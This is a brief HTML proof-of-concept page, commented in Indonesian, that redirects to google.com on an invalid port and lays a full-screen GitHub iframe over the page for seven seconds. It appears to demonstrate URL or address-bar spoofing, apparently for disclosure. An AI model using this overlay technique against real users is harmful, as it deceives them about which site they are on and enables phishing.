<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>POC Google Overlay</title>
<style>
body { font-family: Arial; text-align: center; margin-top: 50px; }
button { padding: 12px 24px; font-size: 16px; }
</style>
</head>
<body>
<h2>POC: Google URL dengan overlay GitHub sementara</h2>
<p>Klik tombol untuk mulai POC.</p>
<button id="start">Start</button>

<script>
const startBtn = document.getElementById("start");

startBtn.onclick = function() {
    // Step 1: redirect ke google.com
    window.location.replace("https://google.com:0000");

    // Step 2: buat overlay sementara
    const overlay = document.createElement('iframe');
    overlay.src = "https://github.com";
    overlay.style.position = "fixed";
    overlay.style.top = 0;
    overlay.style.left = 0;
    overlay.style.width = "100%";
    overlay.style.height = "100%";
    overlay.style.border = "none";
    overlay.id = "githubOverlay";
    document.body.appendChild(overlay);

    // Step 3: hapus overlay setelah 7 detik
    setTimeout(() => {
        const o = document.getElementById("githubOverlay");
        if(o) o.remove();
    }, 7000);
};
</script>
</body>
</html>
